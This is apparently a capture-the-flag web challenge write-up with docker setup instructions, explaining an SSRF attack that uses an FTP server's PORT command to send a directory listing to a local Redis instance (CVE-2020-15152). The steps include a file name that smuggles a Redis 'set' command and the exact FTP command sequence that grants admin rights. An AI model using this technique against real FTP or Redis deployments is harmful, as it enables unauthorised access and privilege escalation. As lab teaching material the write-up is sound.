# SSRF FTP->REDIS
> Web
Author: @KptCheeseWhiz

## Challenge
I found this cool application on the internet. I bet it's super old since it's still using good ol' FTP. I hope they kept their dependencies up to date..

## Write up

Old challenge never solved, was a 0day at the time, but now it has a CVE-2020-15152

Using the same credentials (eg: `rootroot:rootroot`)

1. Login on the FTP server with a ftp client
2. Try downloading a file name `test`, you will see an error with the path which contains your `hash` or call the `/api/is_admin`
3. Create a file named `set YOUR_HASH_admin 1` (replace YOUR_HASH) on your computer
4. Upload the file on the FTP server with `put "set YOUR_HASH_admin 1"`
5. Login back on the FTP server with telnet and enter these commands (this basicly send the dirlist to the redis server which will interpret it as commands)
    1. USER rootroot
    2. PASS rootroot
    3. PORT 127,0,0,1,0,6379
    4. NLST
    5. QUIT
6. Login back on the FTP server with a ftp client
7. Download the file named flag

## Setup

### Requirements
 - docker
 - docker-compose

### How to run
 - Execute the command `docker-compose up`